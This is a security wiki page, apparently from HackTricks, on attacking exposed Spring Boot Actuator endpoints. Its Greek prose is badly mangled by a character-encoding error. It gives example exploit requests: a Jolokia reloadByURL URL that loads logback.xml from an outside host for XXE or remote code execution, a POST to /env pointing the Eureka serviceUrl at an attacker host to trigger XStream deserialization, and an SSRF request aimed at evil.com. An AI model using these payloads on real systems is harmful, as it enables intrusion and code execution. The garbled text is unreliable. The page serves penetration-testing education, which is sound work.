# Spring Actuators

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}

## **Spring Auth Bypass**

<figure><img src="../../.gitbook/assets/image (927).png" alt=""><figcaption></figcaption></figure>

**Î‘Ï€ÏŒ** [**https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png**](https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png)\*\*\*\*

## Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Spring Boot Actuators

**Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î·Î½ Î±ÏÏ‡Î¹ÎºÎ® Î±Î½Î¬ÏÏ„Î·ÏƒÎ· Î±Ï€ÏŒ** \[**https://www.veracode.com/blog/research/exploiting-spring-boot-actuators**]

### **Î’Î±ÏƒÎ¹ÎºÎ¬ Î£Î·Î¼ÎµÎ¯Î±:**

* ÎŸÎ¹ Spring Boot Actuators ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ¿ÏÎ½ endpoints ÏŒÏ€Ï‰Ï‚ `/health`, `/trace`, `/beans`, `/env`, Îº.Î»Ï€. Î£Îµ ÎµÎºÎ´ÏŒÏƒÎµÎ¹Ï‚ 1 Î­Ï‰Ï‚ 1.4, Î±Ï…Ï„Î¬ Ï„Î± endpoints ÎµÎ¯Î½Î±Î¹ Ï€ÏÎ¿ÏƒÎ²Î¬ÏƒÎ¹Î¼Î± Ï‡Ï‰ÏÎ¯Ï‚ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·. Î‘Ï€ÏŒ Ï„Î·Î½ Î­ÎºÎ´Î¿ÏƒÎ· 1.5 ÎºÎ±Î¹ Î¼ÎµÏ„Î¬, Î¼ÏŒÎ½Î¿ Ï„Î± `/health` ÎºÎ±Î¹ `/info` ÎµÎ¯Î½Î±Î¹ Î¼Î· ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Î± Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®, Î±Î»Î»Î¬ Î¿Î¹ Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÏ„Î­Ï‚ ÏƒÏ…Ï‡Î½Î¬ Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î¿ÏÎ½ Î±Ï…Ï„Î® Ï„Î·Î½ Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±.
* ÎŸÏÎ¹ÏƒÎ¼Î­Î½Î± endpoints Actuator Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎµÎºÎ¸Î­ÏƒÎ¿Ï…Î½ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î® Î½Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎ¿Ï…Î½ ÎµÏ€Î¹Î²Î»Î±Î²ÎµÎ¯Ï‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚:
* `/dump`, `/trace`, `/logfile`, `/shutdown`, `/mappings`, `/env`, `/actuator/env`, `/restart`, ÎºÎ±Î¹ `/heapdump`.
* Î£Ï„Î¿ Spring Boot 1.x, Î¿Î¹ actuators ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ¿ÏÎ½Ï„Î±Î¹ ÎºÎ¬Ï„Ï‰ Î±Ï€ÏŒ Ï„Î· ÏÎ¯Î¶Î± URL, ÎµÎ½Ï ÏƒÏ„Î¿ 2.x, Î²ÏÎ¯ÏƒÎºÎ¿Î½Ï„Î±Î¹ ÎºÎ¬Ï„Ï‰ Î±Ï€ÏŒ Ï„Î· Î²Î¬ÏƒÎ· `/actuator/`.

### **Î¤ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚:**

1. **Î‘Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î· Î•ÎºÏ„Î­Î»ÎµÏƒÎ· ÎšÏÎ´Î¹ÎºÎ± Î¼Î­ÏƒÏ‰ '/jolokia'**:
* Î¤Î¿ endpoint `/jolokia` ÎµÎºÎ¸Î­Ï„ÎµÎ¹ Ï„Î· Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ· Jolokia, Î· Î¿Ï€Î¿Î¯Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ HTTP Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ MBeans.
* Î— ÎµÎ½Î­ÏÎ³ÎµÎ¹Î± `reloadByURL` Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ Î³Î¹Î± Î½Î± ÎµÏ€Î±Î½Î±Ï†Î¿ÏÏ„ÏÏƒÎµÎ¹ Ï„Î¹Ï‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ ÎºÎ±Ï„Î±Î³ÏÎ±Ï†Î®Ï‚ Î±Ï€ÏŒ Î¼Î¹Î± ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÎ® Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· URL, ÎºÎ¬Ï„Î¹ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¿Î´Î·Î³Î®ÏƒÎµÎ¹ ÏƒÎµ Ï„Ï…Ï†Î»ÏŒ XXE Î® Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î· ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎºÏÎ´Î¹ÎºÎ± Î¼Î­ÏƒÏ‰ ÎºÎ±Ï„Î±ÏƒÎºÎµÏ…Î±ÏƒÎ¼Î­Î½Ï‰Î½ XML ÏÏ…Î¸Î¼Î¯ÏƒÎµÏ‰Î½.
* Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± URL ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚: `http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml`.
2. **Î¤ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î¡Ï…Î¸Î¼Î¯ÏƒÎµÏ‰Î½ Î¼Î­ÏƒÏ‰ '/env'**:
* Î•Î¬Î½ Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚ Spring Cloud, Ï„Î¿ endpoint `/env` ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï€ÎµÏÎ¹Î²Î±Î»Î»Î¿Î½Ï„Î¹ÎºÏÎ½ Î¹Î´Î¹Î¿Ï„Î®Ï„Ï‰Î½.
* ÎŸÎ¹ Î¹Î´Î¹ÏŒÏ„Î·Ï„ÎµÏ‚ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î¿ÏÎ½ Î³Î¹Î± Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„Î¿ÏÎ½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚, ÏŒÏ€Ï‰Ï‚ Î· ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± Î±Ï€Î¿ÏƒÏ…Î¼Ï€Î¯ÎµÏƒÎ·Ï‚ XStream ÏƒÏ„Î·Î½ Ï…Ï€Î·ÏÎµÏƒÎ¯Î± Eureka serviceURL.
*   Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î±Î¯Ï„Î·ÏƒÎ·Ï‚ POST ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚:

```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream
```
3. **Î†Î»Î»ÎµÏ‚ Î§ÏÎ®ÏƒÎ¹Î¼ÎµÏ‚ Î¡Ï…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚**:
* Î™Î´Î¹ÏŒÏ„Î·Ï„ÎµÏ‚ ÏŒÏ€Ï‰Ï‚ `spring.datasource.tomcat.validationQuery`, `spring.datasource.tomcat.url`, ÎºÎ±Î¹ `spring.datasource.tomcat.max-active` Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î¿ÏÎ½ Î³Î¹Î± Î´Î¹Î¬Ï†Î¿ÏÎµÏ‚ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÏƒÎµÎ¹Ï‚, ÏŒÏ€Ï‰Ï‚ SQL injection Î® Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÏÎ½ ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚ Î²Î¬ÏƒÎ·Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½.

### **Î ÏÏŒÏƒÎ¸ÎµÏ„ÎµÏ‚ Î Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚:**

* ÎœÎ¹Î± Î¿Î»Î¿ÎºÎ»Î·ÏÏ‰Î¼Î­Î½Î· Î»Î¯ÏƒÏ„Î± Î¼Îµ Ï„Î¹Ï‚ Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½ÎµÏ‚ actuators Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î²ÏÎµÎ¸ÎµÎ¯ [ÎµÎ´Ï](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt).
* Î¤Î¿ endpoint `/env` ÏƒÏ„Î¿ Spring Boot 2.x Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Î¼Î¿ÏÏ†Î® JSON Î³Î¹Î± Ï„Î·Î½ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î¹Î´Î¹Î¿Ï„Î®Ï„Ï‰Î½, Î±Î»Î»Î¬ Î· Î³ÎµÎ½Î¹ÎºÎ® Î­Î½Î½Î¿Î¹Î± Ï€Î±ÏÎ±Î¼Î­Î½ÎµÎ¹ Î· Î¯Î´Î¹Î±.

### **Î£Ï‡ÎµÏ„Î¹ÎºÎ¬ Î˜Î­Î¼Î±Ï„Î±:**

1. **Env + H2 RCE**:
* Î›ÎµÏ€Ï„Î¿Î¼Î­ÏÎµÎ¹ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î·Î½ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Ï„Î¿Ï… ÏƒÏ…Î½Î´Ï…Î±ÏƒÎ¼Î¿Ï Ï„Î¿Ï… endpoint `/env` ÎºÎ±Î¹ Ï„Î·Ï‚ Î²Î¬ÏƒÎ·Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ H2 Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î²ÏÎµÎ¸Î¿ÏÎ½ [ÎµÎ´Ï](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database).
2. **SSRF ÏƒÏ„Î¿ Spring Boot Î¼Î­ÏƒÏ‰ Î›Î±Î½Î¸Î±ÏƒÎ¼Î­Î½Î·Ï‚ Î•ÏÎ¼Î·Î½ÎµÎ¯Î±Ï‚ ÎŸÎ½ÏŒÎ¼Î±Ï„Î¿Ï‚ Î”Î¹Î±Î´ÏÎ¿Î¼Î®Ï‚**:
* Î— Î´Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ· Ï€Î±ÏÎ±Î¼Î­Ï„ÏÏ‰Î½ Î¼Î®Ï„ÏÎ±Ï‚ (`;`) Î±Ï€ÏŒ Ï„Î¿ Ï€Î»Î±Î¯ÏƒÎ¹Î¿ Spring ÏƒÎµ Î´Î¹Î±Î´ÏÎ¿Î¼Î­Ï‚ HTTP Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ Î³Î¹Î± Server-Side Request Forgery (SSRF).
*   Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î±Î¯Ï„Î·ÏƒÎ·Ï‚ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚:

```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
</details>
{% endhint %}
